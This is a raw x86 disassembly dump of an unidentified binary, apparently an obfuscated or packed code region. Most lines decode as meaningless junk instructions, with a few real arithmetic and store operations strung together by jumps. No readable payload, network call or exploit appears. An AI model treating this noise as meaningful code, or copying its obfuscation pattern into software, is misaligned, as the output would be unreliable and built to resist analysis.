  40cf58:	shl    esi,cl
  40cf5a:	aaa    
  40cf5b:	je     0x40cf44
  40cf5d:	cmp    ch,bl
  40cf5f:	js     0x40cf3e
  40cf61:	jnp    0x40cf3e
  40cf63:	push   ss
  40cf64:	daa    
  40cf65:	and    eax,0xd11c308f
  40cf6a:	dec    esi
  40cf6b:	ins    DWORD PTR es:[edi],dx
  40cf6c:	mov    BYTE PTR [esi-0xb],cl
  40cf6f:	jbe    0x40cfdc
  40cf71:	fwait
  40cf72:	into   
  40cf73:	xor    BYTE PTR [edi+0x758362bf],dh
  40cf79:	cwde   
  40cf7a:	pop    ecx
  40cf7b:	inc    ecx
  40cf7c:	cmp    al,dh
  40cf7e:	jmp    0x40cf5a
  40cf80:	cdq    
  40cf81:	mov    esi,0xa75e9a11
  40cf86:	lea    edx,[edi]
  40cf88:	adc    ah,BYTE PTR [esi+ebx*2]
  40cf8b:	cmc    
  40cf8c:	lea    esp,[ecx+0x63d33adb]
  40cf92:	jmp    0xb189:0xe662b038
  40cf99:	pcmpgtd mm0,mm1
  40cf9c:	adc    DWORD PTR [edx-0x26],edi
  40cf9f:	aaa    
  40cfa0:	into   
  40cfa1:	and    eax,0x45891048
  40cfa6:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40cfac:	add    eax,edx
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	mov    esi,edi
  40cfca:	daa    
  40cfcb:	add    ecx,DWORD PTR [ecx+ecx*4+0x7e]
  40cfcf:	jle    0x40d010
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40cfe3
  40cfd5:	test   al,0x38
  40cfd7:	clc    
  40cfd8:	jb     0x40d00b
  40cfda:	sub    DWORD PTR [esi],ecx
  40cfdc:	test   DWORD PTR [esi+ecx*2-0x14931e8f],eax
  40cfe3:	test   esi,edi
  40cfe5:	jp     0x40d04b
  40cfe7:	adc    cl,ah
  40cfe9:	sub    DWORD PTR [edi-0x33],0xffffff87
  40cfed:	aas    
  40cfee:	outs   dx,DWORD PTR ds:[esi]
  40cfef:	mov    ds:0x35b2b4d8,al
  40cff4:	jns    0x40cf84
  40cff6:	xor    BYTE PTR [esi-0xa],dh
  40cff9:	sub    al,0x59
  40cffb:	jl     0x40cfb8
  40cffd:	stc    
  40cffe:	neg    BYTE PTR [edi-0x524c8587]
  40d004:	jmp    0x40cfa0
  40d006:	in     eax,0xd5
  40d008:	mov    bl,0x1b
  40d00a:	mov    ebp,0x8e4bf27a
  40d00f:	outs   dx,DWORD PTR ds:[esi]
  40d010:	addr16 pop eax
  40d012:	mov    ecx,0x27ab543
  40d018:	push   esp
  40d019:	ror    DWORD PTR [edx+0x32c56b53],0xc4
  40d020:	and    bl,dh
  40d022:	jnp    0x40d03d
  40d024:	pop    edx
  40d025:	sub    BYTE PTR [ebp+0x6e274de],0xce
  40d02c:	inc    esp
  40d02d:	jns    0x40d05f
  40d02f:	test   dl,al
  40d031:	icebp  
  40d032:	mov    al,ds:0xe3c68678
  40d037:	dec    ebp
  40d038:	push   esi
  40d039:	fld    st(5)
  40d03b:	push   esi
  40d03c:	aad    0xcd
  40d03e:	cwde   
  40d03f:	out    0xb,al
  40d041:	xchg   ebx,eax
  40d042:	inc    eax
  40d043:	or     bl,BYTE PTR [ecx-0x1a72a5c]
  40d049:	adc    al,BYTE PTR [ecx-0x19]
  40d04c:	pop    esp
  40d04d:	(bad)  
  40d04e:	fcmovnb st,st(1)
  40d050:	jns    0x40d055
  40d052:	jmp    0x87c68905
  40d057:	(bad)  
  40d058:	sbb    eax,0x245a9a09
  40d05d:	les    ecx,FWORD PTR [edi+ebp*1-0x66]
  40d061:	xlat   BYTE PTR ds:[ebx]
  40d062:	int    0x2
  40d064:	sbb    eax,DWORD PTR [esp+ecx*8+0x55cfa909]
  40d06b:	cs mov bl,0xc7
  40d06e:	and    eax,0xdc896d71
  40d073:	adc    al,0x7a
  40d075:	fild   WORD PTR [ebx+0x10]
  40d078:	in     al,0xdb
  40d07a:	ins    DWORD PTR es:[edi],dx
  40d07b:	dec    ecx
  40d07c:	dec    ebx
  40d07d:	arpl   WORD PTR [ebp-0x5e],dx
  40d080:	inc    eax
  40d081:	arpl   WORD PTR [edi-0x69d5293f],sp
  40d087:	outs   dx,DWORD PTR ds:[esi]
  40d088:	and    al,0x76
  40d08a:	cmp    ax,0xceb8
  40d08e:	and    DWORD PTR [ebx-0x49],edx
  40d091:	rcr    BYTE PTR [ebp-0x8bf7672],1
  40d097:	pusha  
  40d098:	cli    
  40d099:	test   ah,bl
  40d09b:	popf   
  40d09c:	inc    eax
  40d09d:	mov    dh,0xe6
  40d09f:	es icebp 
  40d0a1:	pushf  
  40d0a2:	imul   ebx,esi,0x4a46bf8e
  40d0a8:	ins    DWORD PTR es:[edi],dx
  40d0a9:	xor    dh,dl
  40d0ab:	cdq    
  40d0ac:	and    DWORD PTR ds:0x5410fdad,esi
  40d0b2:	pop    edx
  40d0b3:	repz call 0x1ffd4c5c
  40d0b9:	ds xchg ebp,eax
  40d0bb:	in     al,dx
  40d0bc:	and    ch,BYTE PTR [ecx+ecx*4]
  40d0bf:	jo     0x40d0f3
  40d0c1:	retf   0x2c3c
  40d0c4:	xchg   esi,eax
  40d0c5:	stos   BYTE PTR es:[edi],al
  40d0c6:	adc    eax,0xd2a89efa
  40d0cb:	ins    DWORD PTR es:[edi],dx
  40d0cc:	jb     0x40d090
  40d0ce:	xchg   edi,eax
  40d0cf:	push   edx
  40d0d0:	sub    dh,ch
  40d0d2:	fwait
  40d0d3:	sub    al,0x14
  40d0d5:	push   0x5ae0d84c
  40d0da:	data16 repz cli 
  40d0dd:	sub    ecx,DWORD PTR [ebp+eax*4+0x35]
  40d0e1:	pop    ebp
  40d0e2:	pop    edx
  40d0e3:	jmp    0x105e:0xf678a078
  40d0ea:	loope  0x40d13d
  40d0ec:	inc    esp
  40d0ed:	(bad)  
  40d0ee:	cmp    ebp,DWORD PTR [eax]
  40d0f0:	loope  0x40d141
  40d0f2:	jns    0x40d11e
  40d0f4:	ss retw 
  40d0f7:	xchg   esp,eax
  40d0f8:	outs   dx,DWORD PTR ds:[esi]
  40d0f9:	outs   dx,DWORD PTR ds:[esi]
  40d0fa:	pop    ss
  40d0fb:	xor    DWORD PTR [edi],eax
  40d0fd:	and    al,0xc5
  40d0ff:	and    BYTE PTR [ecx],0x73
  40d102:	mov    eax,DWORD PTR [edx]
  40d104:	stos   BYTE PTR es:[edi],al
  40d105:	jne    0x40d113
  40d107:	out    dx,al
  40d108:	test   DWORD PTR [eax+0x61],eax
  40d10b:	stos   BYTE PTR es:[edi],al
  40d10c:	mov    eax,0xf0ebe9d8
  40d111:	xchg   ebx,eax
  40d112:	ins    DWORD PTR es:[edi],dx
  40d113:	retf   0x33d6
  40d116:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40d11c:	or     bl,BYTE PTR [ebp+0x3b003272]
  40d122:	enter  0x840f,0xe9
  40d126:	add    eax,0x7d8b0000
  40d12b:	call   0x8b4916bb
  40d130:	push   ebp
  40d131:	adc    al,0x8b
  40d133:	inc    esp
  40d134:	add    BYTE PTR [ecx+edi*4],0x56
  40d138:	or     BYTE PTR [ecx+0x7],dl
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	sub    BYTE PTR [ebx-0x27],0x9f
  40d161:	int3   
  40d162:	or     eax,0x3f7e7e8b
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d137
  40d16b:	jg     0x40d1c5
  40d16d:	xchg   edi,eax
  40d16e:	into   
  40d16f:	jno    0x40d145
  40d171:	outs   dx,DWORD PTR ds:[esi]
  40d172:	call   0xb651:0xf68e0ed7
  40d179:	ja     0x40d19c
  40d17b:	mov    al,0x49
  40d17d:	jno    0x40d115
  40d17f:	pop    edx
  40d180:	dec    esp
  40d181:	lds    esp,FWORD PTR [ebx-0x50556379]
  40d187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d188:	push   ss
  40d189:	xor    ch,al
  40d18b:	sbb    al,0xf9
  40d18d:	dec    eax
  40d18e:	mov    bh,0x8a
  40d190:	xchg   edx,eax
  40d191:	mov    bl,0xd1
  40d193:	push   0xc663e7f8
  40d198:	aaa    
  40d199:	std    
  40d19a:	ret    0xa426
  40d19d:	add    ebp,DWORD PTR [ebp+ecx*4-0x1818f6c0]
  40d1a4:	pop    ss
  40d1a5:	neg    DWORD PTR [ecx+0x8]
  40d1a8:	xchg   ebp,eax
  40d1a9:	pop    ebp
  40d1aa:	mov    dh,0x72
  40d1ac:	cmc    
  40d1ad:	pop    ss
  40d1ae:	sub    DWORD PTR [edx+0x26],edi
  40d1b1:	fsubr  st(6),st
  40d1b3:	adc    eax,0x94916cd
  40d1b8:	pop    ecx
  40d1b9:	sbb    dh,cl
  40d1bb:	scas   al,BYTE PTR es:[edi]
  40d1bc:	sbb    dl,ah
  40d1be:	mov    al,0xd2
  40d1c0:	sub    eax,0xce96b725
  40d1c6:	clc    
  40d1c7:	xchg   ecx,eax
  40d1c8:	int3   
  40d1c9:	mov    eax,0xbe790cba
  40d1ce:	lods   eax,DWORD PTR ds:[esi]
  40d1cf:	xchg   ebp,eax
  40d1d0:	inc    esp
  40d1d1:	sbb    bh,BYTE PTR [ebx+0xa]
  40d1d4:	jo     0x40d1cf
  40d1d6:	mov    ds,WORD PTR [ecx+0x21bdc923]
  40d1dc:	jle    0x40d181
  40d1de:	mov    ch,0x2
  40d1e0:	xor    BYTE PTR [eax+0x5509bd9f],dh
  40d1e6:	stc    
  40d1e7:	add    esi,DWORD PTR [ebx+ebp*8-0x6dff9ea7]
  40d1ee:	btr    DWORD PTR [eax],eax
  40d1f1:	mov    al,ds:0x899953ba
  40d1f6:	mov    ah,ah
  40d1f8:	fimul  DWORD PTR [ebp-0x10d655b0]
  40d1fe:	pop    edi
  40d1ff:	lahf   
  40d200:	stos   DWORD PTR es:[edi],eax
  40d201:	je     0x40d1cb
  40d203:	adc    ecx,ebp
  40d205:	sbb    DWORD PTR [esi],ebx
  40d207:	lods   al,BYTE PTR ds:[esi]
  40d208:	ror    DWORD PTR [ebp+0x43],1
  40d20b:	cmp    eax,0x9a234609
  40d210:	sub    DWORD PTR ds:0x497efbed,ebx
  40d216:	mov    ebx,0xe92c8d9f
  40d21b:	int    0xc3
  40d21d:	jne    0x40d293
  40d21f:	int    0x5d
  40d221:	loop   0x40d285
  40d223:	or     BYTE PTR [ebp+ecx*4+0x4b],bl
  40d227:	in     al,0x9b
  40d229:	nop
  40d22a:	mov    edi,0xbbcb54e1
  40d22f:	jle    0x40d22f
  40d231:	or     al,0xe5
  40d234:	repz cwde 
  40d236:	push   ebp
  40d237:	imul   ebx,DWORD PTR [esi],0x3
  40d23a:	mov    esp,0xd64b9af3
  40d23f:	cwde   
  40d240:	lock inc edx
  40d242:	xor    DWORD PTR [eax+0x5d],ecx
  40d245:	jmp    0xe8b7f8e7
  40d24a:	outs   dx,DWORD PTR ds:[esi]
  40d24b:	cdq    
  40d24c:	push   0xffffffd9
  40d24e:	xchg   esp,eax
  40d24f:	test   DWORD PTR [ebx],eax
  40d251:	mov    ebx,0x8286e3b1
  40d256:	add    eax,0xb599f150
  40d25b:	lods   al,BYTE PTR ds:[esi]
  40d25c:	repz dec esp
  40d25e:	fisub  WORD PTR [ecx-0x369f49ca]
  40d264:	es sti 
  40d266:	sbb    dl,BYTE PTR [ebx+0x1309671c]
  40d26c:	sub    DWORD PTR [eax],edx
  40d26e:	retf   
  40d26f:	test   BYTE PTR [eax],0x71
  40d272:	push   0xb3302347
  40d277:	jmp    0x42f:0x6352d32d
  40d27e:	adc    DWORD PTR [esi],0x606e901d
  40d284:	in     al,dx
  40d285:	adc    al,0x7a
  40d287:	test   DWORD PTR [esi-0x3790fd78],0x4a81c371
  40d291:	sti    
  40d292:	in     eax,dx
  40d293:	jnp    0x40d24f
  40d295:	bound  edi,QWORD PTR [edi-0x40b4ba59]
  40d29b:	fcomp  QWORD PTR [ecx+0xeea1628]
  40d2a1:	xchg   ah,dh
  40d2a3:	inc    ecx
  40d2a4:	mov    eax,0xe0507f33
  40d2a9:	repnz push esp
  40d2ab:	lea    eax,[edx+eax*1+0x32729d]
  40d2b2:	mov    edx,DWORD PTR [ebp+0x8]
  40d2b5:	mov    edi,DWORD PTR [ebp-0x24]
  40d2b8:	mov    DWORD PTR [edi+edx*4],eax
  40d2bb:	mov    eax,DWORD PTR [ebp-0x18]
  40d2be:	mov    edx,DWORD PTR [ebp+0x8]
  40d2c1:	xor    eax,ecx
  40d2c3:	lea    eax,[eax+edx*1+0x32729d]
  40d2ca:	mov    DWORD PTR [ebp+0x8],eax
  40d2cd:	mov    eax,DWORD PTR [ebp-0x18]
  40d2d0:	jmp    0x40d42e
  40d2d5:	cs adc al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	xchg   BYTE PTR [edx-0x7331ce79],al
  40d2e7:	jle    0x40d367
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d2d8
  40d2ee:	fld    QWORD PTR [edx+0x19]
  40d2f1:	call   0x5fb73504
  40d2f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2f7:	out    0xbc,eax
  40d2f9:	dec    ebx
  40d2fa:	dec    edi
  40d2fb:	lock adc BYTE PTR fs:[esi-0x78c99263],dl
  40d303:	in     al,0xb1
  40d305:	fild   QWORD PTR [edi-0x67aa1f79]
  40d30b:	pop    eax
  40d30c:	jno    0x40d36c
  40d30e:	fwait
  40d30f:	sbb    al,0x7b
  40d311:	add    esi,eax
  40d313:	gs add al,0x60
  40d316:	(bad)  [eax+0x36461d49]
  40d31c:	push   cs
  40d31d:	xchg   ebx,eax
  40d31e:	sbb    al,0xf3
  40d320:	fidiv  WORD PTR [ebp+0x1645f67d]
  40d326:	xchg   BYTE PTR [ecx-0x785ad139],cl
  40d32c:	sbb    DWORD PTR [edi-0xb],ebp
  40d32f:	push   edx
  40d330:	sub    BYTE PTR ds:0x506ea6b5,cl
  40d336:	loop   0x40d39c
  40d338:	sar    DWORD PTR [ebx-0x28cb6cb7],1
  40d33e:	sbb    BYTE PTR [ecx],ch
  40d340:	dec    edi
  40d341:	push   esp
  40d342:	jb     0x40d30a
  40d344:	jge    0x40d304
  40d346:	imul   edi,edx,0x404ad2e6
  40d34c:	ja     0x40d2f1
  40d34e:	(bad)  
  40d34f:	leave  
  40d350:	or     bl,BYTE PTR [edi+0x6bf0521c]
  40d356:	dec    edx
  40d357:	sub    DWORD PTR [ebp-0x3e3527fc],ebx
  40d35d:	retf   0xba36
  40d360:	push   esi
  40d361:	(bad)  
  40d362:	out    dx,al
  40d363:	xor    al,0x9
  40d365:	sar    DWORD PTR fs:[eax+ecx*1-0x28],1
  40d36a:	out    0x8b,eax
  40d36c:	test   DWORD PTR [edi],edi
  40d36e:	push   ecx
  40d370:	jp     0x40d3d5
  40d372:	jo     0x40d36f
  40d374:	ret    0x1ba1
  40d377:	fdivr  QWORD PTR [ecx+0x15]
  40d37a:	or     al,0x2b
  40d37c:	or     al,0x61
  40d37e:	stos   DWORD PTR es:[edi],eax
  40d37f:	mov    eax,ds:0x4779624a
  40d384:	mov    ah,0xbb
  40d386:	mov    bl,0xa1
  40d388:	scas   eax,DWORD PTR es:[edi]
  40d389:	push   ebx
  40d38a:	data16 je 0x40d393
  40d38d:	mov    ch,cl
  40d38f:	dec    eax
  40d390:	fs inc ebx
  40d392:	or     eax,0xc642ea91
  40d397:	js     0x40d35e
  40d399:	mov    edi,0xf3853b35
  40d39e:	mov    ebp,0xc8c31bd0
  40d3a3:	xchg   cl,al
  40d3a5:	mov    ds:0xc8447208,eax
  40d3aa:	sbb    eax,0x2ef59ef3
  40d3af:	jb     0x40d39f
  40d3b1:	adc    BYTE PTR [eax],bh
  40d3b3:	cmp    eax,0x82a95a90
  40d3b8:	add    eax,DWORD PTR [edi+esi*2+0x4d]
  40d3bc:	sahf   
  40d3bd:	mov    dh,0xaf
  40d3bf:	push   0x18
  40d3c1:	(bad)  
  40d3c2:	sbb    eax,0xad6d501
  40d3c7:	add    BYTE PTR [ecx],dl
  40d3c9:	dec    edi
  40d3ca:	addr16 xor al,0x95
  40d3cd:	sbb    edi,DWORD PTR [ebx-0x5a78ddec]
  40d3d3:	xor    ah,bh
  40d3d5:	and    al,0xa8
  40d3d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3d8:	inc    edi
  40d3d9:	add    DWORD PTR [ecx],esi
  40d3db:	into   
  40d3dc:	inc    ecx
  40d3dd:	push   edi
  40d3de:	xchg   ebp,eax
  40d3df:	bnd jne 0x40d3bb
  40d3e2:	pop    ss
  40d3e3:	daa    
  40d3e4:	lds    ebp,FWORD PTR [esi-0x3b]
  40d3e7:	lods   eax,DWORD PTR ds:[esi]
  40d3e8:	sub    ch,BYTE PTR [edi]
  40d3ea:	out    dx,al
  40d3eb:	cmp    al,0x99
  40d3ed:	mov    al,ds:0xea9ce3b2
  40d3f2:	(bad)  
  40d3f4:	out    0xf3,eax
  40d3f6:	popf   
  40d3f7:	ret    0x60b5
  40d3fa:	repnz stc 
  40d3fc:	iret   
  40d3fd:	gs jg  0x40d46d
  40d400:	fidiv  DWORD PTR [ebp-0x26]
  40d403:	cmp    BYTE PTR [ecx],dh
  40d405:	jecxz  0x40d3f6
  40d407:	fld    st(1)
  40d409:	dec    edi
  40d40a:	les    esp,FWORD PTR [edi+0x63128e06]
  40d410:	add    al,dh
  40d412:	inc    esp
  40d413:	mov    eax,ds:0xf0603151
  40d418:	fistp  DWORD PTR [ebp-0x8]
  40d41b:	xor    al,bl
  40d41d:	out    0x5a,al
  40d41f:	sbb    eax,0x8aa32b87
  40d424:	and    al,0xc9
  40d426:	push   cs
  40d427:	aas    
  40d428:	inc    ebx
  40d429:	fmul   QWORD PTR fs:[ebp+0x57]
  40d42d:	xor    DWORD PTR [ebx-0x3eccebab],ecx
  40d433:	add    eax,esi
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	cmp    al,0x55
  40d44b:	mov    bh,0x2d
  40d44d:	(bad)  
  40d44e:	lea    edi,[esi+0x7e]
  40d451:	aas    
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d44c
  40d456:	push   edi
  40d457:	jmp    0xc141:0x4f88769f
  40d45e:	mov    ebx,0x42deeb9b
  40d463:	aad    0x5a
  40d465:	pusha  
  40d466:	ins    BYTE PTR es:[edi],dx
  40d467:	xchg   DWORD PTR [edi],ebp
  40d469:	push   ss
  40d46a:	push   ebp
  40d46b:	dec    edi
  40d46c:	in     al,dx
  40d46d:	xlat   BYTE PTR ds:[ebx]
  40d46e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d46f:	js     0x40d4ec
  40d471:	sub    bh,BYTE PTR [edi+0x271a396c]
  40d477:	pop    esp
  40d478:	sbb    ebx,DWORD PTR [esi-0x67]
  40d47b:	loopne 0x40d414
  40d47d:	xlat   BYTE PTR ds:[ebx]
  40d47e:	ror    ebx,1
  40d480:	sbb    eax,0x5604c17
  40d485:	push   ecx
  40d486:	add    eax,0xaf4a2f3
  40d48b:	pop    eax
  40d48c:	push   ss
  40d48d:	(bad)  
  40d48f:	pop    ds
  40d490:	imul   eax,esp,0xd89dc213
  40d496:	adc    DWORD PTR [eax+0x59],esi
  40d499:	adc    bh,BYTE PTR [ebp+0x18]
  40d49c:	loope  0x40d41e
  40d49e:	sbb    al,0xcb
  40d4a0:	cmp    cl,BYTE PTR [eax+edi*2+0x18908358]
  40d4a7:	test   eax,0xfd78ce44
  40d4ac:	repnz popa 
  40d4ae:	mov    ah,0xb5
  40d4b0:	pop    edi
  40d4b1:	cmp    eax,0xdad1a390
  40d4b6:	inc    esi
  40d4b7:	jno    0x40d46c
  40d4b9:	sti    
  40d4ba:	add    al,0xc7
  40d4bc:	push   edx
  40d4bd:	mov    ch,0x7a
  40d4bf:	repz test DWORD PTR [eax],ecx
  40d4c2:	cdq    
  40d4c3:	or     BYTE PTR [edx],0x85
  40d4c6:	and    DWORD PTR [edx-0x10],ebp
  40d4c9:	add    al,0x29
  40d4cb:	sbb    al,0x90
  40d4cd:	outs   dx,DWORD PTR ds:[esi]
  40d4ce:	dec    edi
  40d4cf:	jp     0x40d4d8
  40d4d1:	jae    0x40d53d
  40d4d3:	adc    eax,0xabdc6a65
  40d4d8:	scas   al,BYTE PTR es:[edi]
  40d4d9:	jl     0x40d4c2
  40d4db:	push   cs
  40d4dc:	push   esp
  40d4dd:	rol    bl,cl
  40d4df:	push   cs
  40d4e0:	adc    al,BYTE PTR [esp+edx*2]
  40d4e3:	not    bh
  40d4e5:	ins    DWORD PTR es:[edi],dx
  40d4e6:	pop    ds
  40d4e7:	lahf   
  40d4e8:	lods   al,BYTE PTR ds:[esi]
  40d4e9:	jno    0x40d517
  40d4eb:	jp     0x40d528
  40d4ed:	sysexit 
  40d4ef:	in     eax,dx
  40d4f0:	ret    0x1c0
  40d4f3:	push   ecx
  40d4f4:	mov    ah,0x80
  40d4f6:	out    dx,al
  40d4f7:	jmp    0x29b0cf85
  40d4fc:	cmc    
  40d4fd:	jmp    0x40d567
  40d4ff:	test   al,0x46
  40d501:	scas   al,BYTE PTR es:[edi]
  40d502:	out    0x91,eax
  40d504:	ret    
  40d505:	xor    eax,ebx
  40d507:	sub    DWORD PTR [ebx+0x67],esp
  40d50a:	lea    ebx,[ebx-0x6b0992e5]
  40d510:	nop
  40d511:	xor    esi,esi
  40d513:	cmp    BYTE PTR [esi],dl
  40d515:	or     eax,0x2020e4d7
  40d51a:	adc    al,0x64
  40d51c:	mov    bl,0xaf
  40d51e:	add    ah,dh
  40d520:	ds test DWORD PTR cs:[ebx+0x768fb44e],eax
  40d528:	outs   dx,BYTE PTR ds:[esi]
  40d529:	mov    ch,bh
  40d52b:	cli    
  40d52c:	ja     0x40d557
  40d52e:	in     eax,dx
  40d52f:	mov    al,ds:0xe9068e1c
  40d534:	mov    ecx,0xe01ce65a
  40d539:	pop    ecx
  40d53a:	mov    dl,0x3d
  40d53c:	rcr    dl,cl
  40d53e:	int    0x8c
  40d540:	inc    esi
  40d541:	mov    ds:0x17ba30c2,al
  40d546:	retf   
  40d547:	inc    ecx
  40d548:	xchg   esi,eax
  40d549:	sbb    DWORD PTR [ebx],ebp
  40d54b:	add    cl,BYTE PTR [edx]
  40d54d:	mov    DWORD PTR [edx],esp
  40d54f:	mov    BYTE PTR [ebp-0x464246af],bh
  40d555:	retf   
  40d556:	retf   
  40d557:	dec    eax
  40d558:	stos   DWORD PTR es:[edi],eax
  40d559:	out    0xe9,al
  40d55b:	pop    ds
  40d55c:	ja     0x40d572
  40d55e:	dec    cl
  40d560:	ret    0x3468
  40d563:	cdq    
  40d564:	adc    BYTE PTR [edx],ah
  40d566:	clc    
  40d567:	int3   
  40d568:	aam    0x4d
  40d56a:	push   esp
  40d56b:	add    edx,DWORD PTR [eiz*2+0x50d28198]
  40d572:	(bad)  
  40d573:	retf   
  40d574:	jmp    0xf58adec0
  40d579:	adc    DWORD PTR [edi-0x67],edx
  40d57c:	test   dh,ah
  40d57e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d57f:	clc    
  40d580:	int    0xe8
  40d582:	jge    0x40d5c1
  40d584:	or     al,BYTE PTR [edx+0x33c6d171]
  40d58a:	inc    edi
  40d58b:	retf   
  40d58c:	sbb    bl,0x12
  40d58f:	push   ds
  40d590:	mov    es,WORD PTR [edi-0x578199c6]
  40d596:	mov    edx,DWORD PTR [ebp-0x4]
  40d599:	jmp    0x40d6f7
  40d59e:	out    0xf7,eax
  40d5a0:	cmp    dl,BYTE PTR [esi]
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0xf62bfe4c
  40d5ac:	hlt    
  40d5ad:	jb     0x40d5ef
  40d5af:	mov    ?,WORD PTR [esi+0x7e]
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d547
  40d5b7:	icebp  
  40d5b8:	mov    ecx,0x18dc2fa0
  40d5bd:	cmc    
  40d5be:	in     al,0xd3
  40d5c0:	xchg   edx,eax
  40d5c1:	nop
  40d5c2:	imul   DWORD PTR [edi]
  40d5c4:	mov    ch,0x93
  40d5c6:	jl     0x40d58b
  40d5c8:	dec    edx
  40d5c9:	xor    esp,DWORD PTR [ebx]
  40d5cb:	loopne 0x40d585
  40d5cd:	sbb    DWORD PTR [edi],esp
  40d5cf:	push   0x81e4a5e9
  40d5d4:	pop    ebp
  40d5d6:	scas   al,BYTE PTR es:[edi]
  40d5d7:	xchg   ecx,eax
  40d5d8:	cmp    ch,dl
  40d5da:	not    ecx
  40d5dc:	lods   eax,DWORD PTR ds:[esi]
  40d5dd:	hlt    
  40d5de:	stc    
  40d5df:	pop    ebx
  40d5e0:	jecxz  0x40d5c5
  40d5e2:	dec    BYTE PTR [esi]
  40d5e4:	or     esp,DWORD PTR [esi-0x7fc27440]
  40d5ea:	or     al,0x85
  40d5ec:	loopne 0x40d59a
  40d5ee:	fcom   DWORD PTR [ebx+ebp*1+0x2a33b81e]
  40d5f5:	jle    0x40d5f9
  40d5f7:	js     0x40d604
  40d5f9:	xor    DWORD PTR [edx-0x40d973f8],esp
  40d5ff:	inc    edx
  40d600:	lock aas 
  40d602:	push   0x47
  40d604:	cs cwde 
  40d606:	pop    edx
  40d607:	push   0xffffffe6
  40d609:	or     DWORD PTR [edx+edi*1],ebp
  40d60c:	popa   
  40d60d:	dec    edx
  40d60e:	(bad)  
  40d610:	sbb    eax,0x377b74c2
  40d615:	retf   
  40d616:	mov    eax,0x379d007f
  40d61b:	dec    eax
  40d61c:	xor    cl,BYTE PTR [ebx-0x13]
  40d61f:	cli    
  40d620:	retf   0xa8a2
  40d623:	push   edx
  40d624:	and    ebp,edx
  40d626:	jb     0x40d635
  40d628:	mov    ah,0x2
  40d62a:	(bad)  
  40d62b:	and    esp,esi
  40d62d:	mov    dl,0xda
  40d62f:	sub    DWORD PTR [edx-0x12],0xffffffc4
  40d633:	jne    0x40d6a1
  40d635:	cmp    eax,0xe642ef8
  40d63a:	enter  0xab0e,0x11
  40d63e:	pop    es
  40d63f:	lods   al,BYTE PTR ds:[esi]
  40d640:	jp     0x40d654
  40d642:	loopne 0x40d5dd
  40d644:	pushf  
  40d645:	push   ss
  40d646:	xor    eax,0x2d892ac8
  40d64b:	fsub   st,st(1)
  40d64d:	xlat   BYTE PTR ds:[ebx]
  40d64e:	and    BYTE PTR [ecx],bl
  40d650:	loope  0x40d648
  40d652:	jno    0x40d619
  40d654:	pop    ds
  40d655:	stos   BYTE PTR es:[edi],al
  40d656:	iret   
  40d657:	and    BYTE PTR [eax+0x1d145f71],0x1d
  40d65e:	push   ebp
  40d65f:	add    edi,edi
  40d661:	mov    ch,0xc0
  40d663:	popf   
  40d664:	mov    cl,0x67
  40d666:	lock stos BYTE PTR es:[edi],al
  40d668:	call   DWORD PTR [edx-0x56]
  40d66b:	cmp    BYTE PTR [edx+0x6d317db7],dl
  40d671:	fsubr  DWORD PTR [ecx-0x52b053a7]
  40d677:	mov    BYTE PTR [ebx+0x5c],dh
  40d67a:	add    al,0xdc
  40d67c:	in     al,dx
  40d67d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d67e:	out    0xe6,eax
  40d680:	dec    ebp
  40d681:	cs sti 
  40d683:	fisubr DWORD PTR [edx-0x4c01d628]
  40d689:	jge    0x40d6b5
  40d68b:	xor    al,0x90
  40d68d:	retf   0x436f
  40d690:	and    al,0xc7
  40d692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d693:	jl     0x40d6ca
  40d695:	hlt    
  40d696:	out    dx,al
  40d697:	leave  
  40d698:	jae    0x40d6df
  40d69a:	xor    edi,esp
  40d69c:	push   DWORD PTR [eax-0x73af48fe]
  40d6a2:	jmp    0x40d641
  40d6a4:	dec    eax
  40d6a5:	popa   
  40d6a6:	enter  0x8814,0x6e
  40d6aa:	lea    edi,[esi]
  40d6ac:	out    dx,eax
  40d6ad:	retw   
  40d6af:	add    BYTE PTR [ebx+0x5a],cl
  40d6b2:	repnz push eax
  40d6b4:	and    eax,0x4bfbe392
  40d6b9:	nop
  40d6ba:	and    bl,bl
  40d6bc:	jecxz  0x40d647
  40d6be:	fwait
  40d6bf:	sbb    BYTE PTR [edx-0x4e50dc3c],cl
  40d6c5:	mov    edx,0x94b03136
  40d6ca:	fcomp  QWORD PTR [ebp+ecx*2+0xb]
  40d6ce:	leave  
  40d6cf:	cli    
  40d6d0:	push   eax
